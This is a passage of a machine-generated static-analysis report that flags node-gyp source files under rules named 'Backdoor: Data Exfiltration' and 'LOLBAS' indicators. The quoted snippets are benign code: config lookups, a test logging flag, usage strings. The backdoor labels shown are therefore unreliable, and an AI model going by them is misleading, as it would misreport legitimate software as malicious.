                    "text": "      return\n    }\n\n    const level = this.#levels.get(levelId)\n\n    const prefixParts = [\n      this.#color('gyp', { fg: 'white', bg: 'black' }),\n",
                    "rendered": {
                      "text": "      return\n    }\n\n    const level = this.#levels.get(levelId)\n\n    const prefixParts = [\n      this.#color('gyp', { fg: 'white', bg: 'black' }),\n",
                      "markdown": "`      return\n    }\n\n    const level = this.#levels.get(levelId)\n\n    const prefixParts = [\n      this.#color('gyp', { fg: 'white', bg: 'black' }),\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/log.js"
                },
                "region": {
                  "startLine": 100,
                  "startColumn": 44,
                  "endLine": 100,
                  "endColumn": 49,
                  "snippet": {
                    "text": "  }\n\n  isVisible (level) {\n    return this.level?.index <= this.#levels.get(level)?.index ?? -1\n  }\n\n  #onLog (...args) {\n",
                    "rendered": {
                      "text": "  }\n\n  isVisible (level) {\n    return this.level?.index <= this.#levels.get(level)?.index ?? -1\n  }\n\n  #onLog (...args) {\n",
                      "markdown": "`  }\n\n  isVisible (level) {\n    return this.level?.index <= this.#levels.get(level)?.index ?? -1\n  }\n\n  #onLog (...args) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/log.js"
                },
                "region": {
                  "startLine": 96,
                  "startColumn": 30,
                  "endLine": 96,
                  "endColumn": 35,
                  "snippet": {
                    "text": "  }\n\n  set level (level) {\n    this.#level = this.#levels.get(level)?.id ?? null\n  }\n\n  isVisible (level) {\n",
                    "rendered": {
                      "text": "  }\n\n  set level (level) {\n    this.#level = this.#levels.get(level)?.id ?? null\n  }\n\n  isVisible (level) {\n",
                      "markdown": "`  }\n\n  set level (level) {\n    this.#level = this.#levels.get(level)?.id ?? null\n  }\n\n  isVisible (level) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/log.js"
                },
                "region": {
                  "startLine": 92,
                  "startColumn": 23,
                  "endLine": 92,
                  "endColumn": 28,
                  "snippet": {
                    "text": "  }\n\n  get level () {\n    return this.#levels.get(this.#level) ?? null\n  }\n\n  set level (level) {\n",
                    "rendered": {
                      "text": "  }\n\n  get level () {\n    return this.#levels.get(this.#level) ?? null\n  }\n\n  set level (level) {\n",
                      "markdown": "`  }\n\n  get level () {\n    return this.#levels.get(this.#level) ?? null\n  }\n\n  set level (level) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/log.js"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 22,
                  "endLine": 161,
                  "endColumn": 33,
                  "snippet": {
                    "text": "}\n\n// used to suppress logs in tests\nconst NULL_LOGGER = !!process.env.NODE_GYP_NULL_LOGGER\n\nmodule.exports = {\n  logger: new Logger(NULL_LOGGER ? null : process.stderr),\n",
                    "rendered": {
                      "text": "}\n\n// used to suppress logs in tests\nconst NULL_LOGGER = !!process.env.NODE_GYP_NULL_LOGGER\n\nmodule.exports = {\n  logger: new Logger(NULL_LOGGER ? null : process.stderr),\n",
                      "markdown": "`}\n\n// used to suppress logs in tests\nconst NULL_LOGGER = !!process.env.NODE_GYP_NULL_LOGGER\n\nmodule.exports = {\n  logger: new Logger(NULL_LOGGER ? null : process.stderr),\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/rebuild.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 65,
                  "endLine": 12,
                  "endColumn": 69,
                  "snippet": {
                    "text": "}\n\nmodule.exports = rebuild\nmodule.exports.usage = 'Runs \"clean\", \"configure\" and \"build\" all at once'\n",
                    "rendered": {
                      "text": "}\n\nmodule.exports = rebuild\nmodule.exports.usage = 'Runs \"clean\", \"configure\" and \"build\" all at once'\n",
                      "markdown": "`}\n\nmodule.exports = rebuild\nmodule.exports.usage = 'Runs \"clean\", \"configure\" and \"build\" all at once'\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/remove.js"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 35,
                  "endLine": 43,
                  "endColumn": 41,
                  "snippet": {
                    "text": "}\n\nmodule.exports = remove\nmodule.exports.usage = 'Removes the node development files for the specified version'\n",
                    "rendered": {
                      "text": "}\n\nmodule.exports = remove\nmodule.exports.usage = 'Removes the node development files for the specified version'\n",
                      "markdown": "`}\n\nmodule.exports = remove\nmodule.exports.usage = 'Removes the node development files for the specified version'\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 649,
                  "startColumn": 37,
                  "endLine": 649,
                  "endColumn": 42,
                  "snippet": {
                    "text": "    rel_gyp_file = gyp.common.RelativePath(gyp_file, options.toplevel_dir)\n    rel_gyp_dir = os.path.dirname(rel_gyp_file)\n\n    # Relative path from build dir to top dir.\n    build_to_top = gyp.common.InvertRelativePath(build_dir, options.toplevel_dir)\n    # Relative path from build dir to gyp dir.\n    build_to_gyp = os.path.join(build_to_top, rel_gyp_dir)\n",
                    "rendered": {
                      "text": "    rel_gyp_file = gyp.common.RelativePath(gyp_file, options.toplevel_dir)\n    rel_gyp_dir = os.path.dirname(rel_gyp_file)\n\n    # Relative path from build dir to top dir.\n    build_to_top = gyp.common.InvertRelativePath(build_dir, options.toplevel_dir)\n    # Relative path from build dir to gyp dir.\n    build_to_gyp = os.path.join(build_to_top, rel_gyp_dir)\n",
                      "markdown": "`    rel_gyp_file = gyp.common.RelativePath(gyp_file, options.toplevel_dir)\n    rel_gyp_dir = os.path.dirname(rel_gyp_file)\n\n    # Relative path from build dir to top dir.\n    build_to_top = gyp.common.InvertRelativePath(build_dir, options.toplevel_dir)\n    # Relative path from build dir to gyp dir.\n    build_to_gyp = os.path.join(build_to_top, rel_gyp_dir)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 637,
                  "startColumn": 23,
                  "endLine": 637,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    output,\n):\n    # The make generator does this always.\n    # TODO: It would be nice to be able to tell CMake all dependencies.\n    circular_libs = generator_flags.get(\"circular\", True)\n\n    if not generator_flags.get(\"standalone\", False):\n",
                    "rendered": {
                      "text": "    output,\n):\n    # The make generator does this always.\n    # TODO: It would be nice to be able to tell CMake all dependencies.\n    circular_libs = generator_flags.get(\"circular\", True)\n\n    if not generator_flags.get(\"standalone\", False):\n",
                      "markdown": "`    output,\n):\n    # The make generator does this always.\n    # TODO: It would be nice to be able to tell CMake all dependencies.\n    circular_libs = generator_flags.get(\"circular\", True)\n\n    if not generator_flags.get(\"standalone\", False):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 14,
                  "endLine": 27,
                  "endColumn": 20,
                  "snippet": {
                    "text": "should not be relied on for building.\n\nWhen using with kdevelop, use version 4.4+. Previous versions of kdevelop will\nnot be able to find the header file directories described in the generated\nCMakeLists.txt file.\n\"\"\"\n\n",
                    "rendered": {
                      "text": "should not be relied on for building.\n\nWhen using with kdevelop, use version 4.4+. Previous versions of kdevelop will\nnot be able to find the header file directories described in the generated\nCMakeLists.txt file.\n\"\"\"\n\n",
                      "markdown": "`should not be relied on for building.\n\nWhen using with kdevelop, use version 4.4+. Previous versions of kdevelop will\nnot be able to find the header file directories described in the generated\nCMakeLists.txt file.\n\"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 1297,
                  "startColumn": 51,
                  "endLine": 1297,
                  "endColumn": 56,
                  "snippet": {
                    "text": "\n\ndef GenerateOutput(target_list, target_dicts, data, params):\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if user_config:\n        GenerateOutputForConfig(target_list, target_dicts, data, params, user_config)\n    else:\n",
                    "rendered": {
                      "text": "\n\ndef GenerateOutput(target_list, target_dicts, data, params):\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if user_config:\n        GenerateOutputForConfig(target_list, target_dicts, data, params, user_config)\n    else:\n",
                      "markdown": "`\n\ndef GenerateOutput(target_list, target_dicts, data, params):\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if user_config:\n        GenerateOutputForConfig(target_list, target_dicts, data, params, user_config)\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 1297,
                  "startColumn": 24,
                  "endLine": 1297,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n\ndef GenerateOutput(target_list, target_dicts, data, params):\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if user_config:\n        GenerateOutputForConfig(target_list, target_dicts, data, params, user_config)\n    else:\n",
                    "rendered": {
                      "text": "\n\ndef GenerateOutput(target_list, target_dicts, data, params):\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if user_config:\n        GenerateOutputForConfig(target_list, target_dicts, data, params, user_config)\n    else:\n",
                      "markdown": "`\n\ndef GenerateOutput(target_list, target_dicts, data, params):\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if user_config:\n        GenerateOutputForConfig(target_list, target_dicts, data, params, user_config)\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 1270,
                  "startColumn": 32,
                  "endLine": 1270,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    generator_dir = os.path.relpath(options.generator_output or \".\")\n\n    # output_dir: relative path from generator_dir to the build directory.\n    output_dir = generator_flags.get(\"output_dir\", \"out\")\n\n    for config_name in configurations:\n        # build_dir: relative path from source root to our output files.\n",
                    "rendered": {
                      "text": "    generator_dir = os.path.relpath(options.generator_output or \".\")\n\n    # output_dir: relative path from generator_dir to the build directory.\n    output_dir = generator_flags.get(\"output_dir\", \"out\")\n\n    for config_name in configurations:\n        # build_dir: relative path from source root to our output files.\n",
                      "markdown": "`    generator_dir = os.path.relpath(options.generator_output or \".\")\n\n    # output_dir: relative path from generator_dir to the build directory.\n    output_dir = generator_flags.get(\"output_dir\", \"out\")\n\n    for config_name in configurations:\n        # build_dir: relative path from source root to our output files.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 1178,
                  "startColumn": 41,
                  "endLine": 1178,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    cc = None\n    cxx = None\n\n    make_global_settings = data[gyp_file].get(\"make_global_settings\", [])\n    build_to_top = gyp.common.InvertRelativePath(build_dir, options.toplevel_dir)\n    for key, value in make_global_settings:\n        if key == \"AR\":\n",
                    "rendered": {
                      "text": "    cc = None\n    cxx = None\n\n    make_global_settings = data[gyp_file].get(\"make_global_settings\", [])\n    build_to_top = gyp.common.InvertRelativePath(build_dir, options.toplevel_dir)\n    for key, value in make_global_settings:\n        if key == \"AR\":\n",
                      "markdown": "`    cc = None\n    cxx = None\n\n    make_global_settings = data[gyp_file].get(\"make_global_settings\", [])\n    build_to_top = gyp.common.InvertRelativePath(build_dir, options.toplevel_dir)\n    for key, value in make_global_settings:\n        if key == \"AR\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 1152,
                  "startColumn": 32,
                  "endLine": 1152,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    generator_dir = os.path.relpath(options.generator_output or \".\")\n\n    # output_dir: relative path from generator_dir to the build directory.\n    output_dir = generator_flags.get(\"output_dir\", \"out\")\n\n    # build_dir: relative path from source root to our output files.\n    # e.g. \"out/Debug\"\n",
                    "rendered": {
                      "text": "    generator_dir = os.path.relpath(options.generator_output or \".\")\n\n    # output_dir: relative path from generator_dir to the build directory.\n    output_dir = generator_flags.get(\"output_dir\", \"out\")\n\n    # build_dir: relative path from source root to our output files.\n    # e.g. \"out/Debug\"\n",
                      "markdown": "`    generator_dir = os.path.relpath(options.generator_output or \".\")\n\n    # output_dir: relative path from generator_dir to the build directory.\n    output_dir = generator_flags.get(\"output_dir\", \"out\")\n\n    # build_dir: relative path from source root to our output files.\n    # e.g. \"out/Debug\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 1108,
                  "startColumn": 44,
                  "endLine": 1108,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\n    # Libraries\n    if linkable:\n        external_libs = [lib for lib in spec.get(\"libraries\", []) if len(lib) > 0]\n        if external_libs or static_deps or shared_deps:\n            output.write(\"target_link_libraries(\")\n            output.write(cmake_target_name)\n",
                    "rendered": {
                      "text": "\n    # Libraries\n    if linkable:\n        external_libs = [lib for lib in spec.get(\"libraries\", []) if len(lib) > 0]\n        if external_libs or static_deps or shared_deps:\n            output.write(\"target_link_libraries(\")\n            output.write(cmake_target_name)\n",
                      "markdown": "`\n    # Libraries\n    if linkable:\n        external_libs = [lib for lib in spec.get(\"libraries\", []) if len(lib) > 0]\n        if external_libs or static_deps or shared_deps:\n            output.write(\"target_link_libraries(\")\n            output.write(cmake_target_name)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 1065,
                  "startColumn": 34,
                  "endLine": 1065,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    for rawDep in rawDeps:\n        dep_cmake_name = namer.CreateCMakeTargetName(rawDep)\n        dep_spec = target_dicts.get(rawDep, {})\n        dep_target_type = dep_spec.get(\"type\", None)\n\n        if dep_target_type == \"static_library\":\n            static_deps.append(dep_cmake_name)\n",
                    "rendered": {
                      "text": "    for rawDep in rawDeps:\n        dep_cmake_name = namer.CreateCMakeTargetName(rawDep)\n        dep_spec = target_dicts.get(rawDep, {})\n        dep_target_type = dep_spec.get(\"type\", None)\n\n        if dep_target_type == \"static_library\":\n            static_deps.append(dep_cmake_name)\n",
                      "markdown": "`    for rawDep in rawDeps:\n        dep_cmake_name = namer.CreateCMakeTargetName(rawDep)\n        dep_spec = target_dicts.get(rawDep, {})\n        dep_target_type = dep_spec.get(\"type\", None)\n\n        if dep_target_type == \"static_library\":\n            static_deps.append(dep_cmake_name)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 1064,
                  "startColumn": 31,
                  "endLine": 1064,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    other_deps = []\n    for rawDep in rawDeps:\n        dep_cmake_name = namer.CreateCMakeTargetName(rawDep)\n        dep_spec = target_dicts.get(rawDep, {})\n        dep_target_type = dep_spec.get(\"type\", None)\n\n        if dep_target_type == \"static_library\":\n",
                    "rendered": {
                      "text": "    other_deps = []\n    for rawDep in rawDeps:\n        dep_cmake_name = namer.CreateCMakeTargetName(rawDep)\n        dep_spec = target_dicts.get(rawDep, {})\n        dep_target_type = dep_spec.get(\"type\", None)\n\n        if dep_target_type == \"static_library\":\n",
                      "markdown": "`    other_deps = []\n    for rawDep in rawDeps:\n        dep_cmake_name = namer.CreateCMakeTargetName(rawDep)\n        dep_spec = target_dicts.get(rawDep, {})\n        dep_target_type = dep_spec.get(\"type\", None)\n\n        if dep_target_type == \"static_library\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 1057,
                  "startColumn": 18,
                  "endLine": 1057,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    # Give CMake as little information as possible so that it doesn't mess it up.\n\n    # Dependencies\n    rawDeps = spec.get(\"dependencies\", [])\n\n    static_deps = []\n    shared_deps = []\n",
                    "rendered": {
                      "text": "    # Give CMake as little information as possible so that it doesn't mess it up.\n\n    # Dependencies\n    rawDeps = spec.get(\"dependencies\", [])\n\n    static_deps = []\n    shared_deps = []\n",
                      "markdown": "`    # Give CMake as little information as possible so that it doesn't mess it up.\n\n    # Dependencies\n    rawDeps = spec.get(\"dependencies\", [])\n\n    static_deps = []\n    shared_deps = []\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 1040,
                  "startColumn": 31,
                  "endLine": 1040,
                  "endColumn": 36,
                  "snippet": {
                    "text": "            SetTargetProperty(output, cmake_target_name, \"LINK_FLAGS\", ldflags, \" \")\n\n        # XCode settings\n        xcode_settings = config.get(\"xcode_settings\", {})\n        for xcode_setting, xcode_value in xcode_settings.items():\n            SetTargetProperty(\n                output,\n",
                    "rendered": {
                      "text": "            SetTargetProperty(output, cmake_target_name, \"LINK_FLAGS\", ldflags, \" \")\n\n        # XCode settings\n        xcode_settings = config.get(\"xcode_settings\", {})\n        for xcode_setting, xcode_value in xcode_settings.items():\n            SetTargetProperty(\n                output,\n",
                      "markdown": "`            SetTargetProperty(output, cmake_target_name, \"LINK_FLAGS\", ldflags, \" \")\n\n        # XCode settings\n        xcode_settings = config.get(\"xcode_settings\", {})\n        for xcode_setting, xcode_value in xcode_settings.items():\n            SetTargetProperty(\n                output,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 1035,
                  "startColumn": 24,
                  "endLine": 1035,
                  "endColumn": 29,
                  "snippet": {
                    "text": "                SetFilesProperty(output, cxx_sources_name, \"COMPILE_FLAGS\", flags, \" \")\n\n        # Linker flags\n        ldflags = config.get(\"ldflags\")\n        if ldflags is not None:\n            SetTargetProperty(output, cmake_target_name, \"LINK_FLAGS\", ldflags, \" \")\n\n",
                    "rendered": {
                      "text": "                SetFilesProperty(output, cxx_sources_name, \"COMPILE_FLAGS\", flags, \" \")\n\n        # Linker flags\n        ldflags = config.get(\"ldflags\")\n        if ldflags is not None:\n            SetTargetProperty(output, cmake_target_name, \"LINK_FLAGS\", ldflags, \" \")\n\n",
                      "markdown": "`                SetFilesProperty(output, cxx_sources_name, \"COMPILE_FLAGS\", flags, \" \")\n\n        # Linker flags\n        ldflags = config.get(\"ldflags\")\n        if ldflags is not None:\n            SetTargetProperty(output, cmake_target_name, \"LINK_FLAGS\", ldflags, \" \")\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 993,
                  "startColumn": 27,
                  "endLine": 993,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        # Instead we must...\n        cflags = config.get(\"cflags\", [])\n        cflags_c = config.get(\"cflags_c\", [])\n        cflags_cxx = config.get(\"cflags_cc\", [])\n        if xcode_settings:\n            cflags = xcode_settings.GetCflags(config_to_use)\n            cflags_c = xcode_settings.GetCflagsC(config_to_use)\n",
                    "rendered": {
                      "text": "        # Instead we must...\n        cflags = config.get(\"cflags\", [])\n        cflags_c = config.get(\"cflags_c\", [])\n        cflags_cxx = config.get(\"cflags_cc\", [])\n        if xcode_settings:\n            cflags = xcode_settings.GetCflags(config_to_use)\n            cflags_c = xcode_settings.GetCflagsC(config_to_use)\n",
                      "markdown": "`        # Instead we must...\n        cflags = config.get(\"cflags\", [])\n        cflags_c = config.get(\"cflags_c\", [])\n        cflags_cxx = config.get(\"cflags_cc\", [])\n        if xcode_settings:\n            cflags = xcode_settings.GetCflags(config_to_use)\n            cflags_c = xcode_settings.GetCflagsC(config_to_use)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 992,
                  "startColumn": 25,
                  "endLine": 992,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\n        # Instead we must...\n        cflags = config.get(\"cflags\", [])\n        cflags_c = config.get(\"cflags_c\", [])\n        cflags_cxx = config.get(\"cflags_cc\", [])\n        if xcode_settings:\n            cflags = xcode_settings.GetCflags(config_to_use)\n",
                    "rendered": {
                      "text": "\n        # Instead we must...\n        cflags = config.get(\"cflags\", [])\n        cflags_c = config.get(\"cflags_c\", [])\n        cflags_cxx = config.get(\"cflags_cc\", [])\n        if xcode_settings:\n            cflags = xcode_settings.GetCflags(config_to_use)\n",
                      "markdown": "`\n        # Instead we must...\n        cflags = config.get(\"cflags\", [])\n        cflags_c = config.get(\"cflags_c\", [])\n        cflags_cxx = config.get(\"cflags_cc\", [])\n        if xcode_settings:\n            cflags = xcode_settings.GetCflags(config_to_use)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 991,
                  "startColumn": 23,
                  "endLine": 991,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        #                       'CXX_COMPILE_FLAGS', cflags_cc, ' ')\n\n        # Instead we must...\n        cflags = config.get(\"cflags\", [])\n        cflags_c = config.get(\"cflags_c\", [])\n        cflags_cxx = config.get(\"cflags_cc\", [])\n        if xcode_settings:\n",
                    "rendered": {
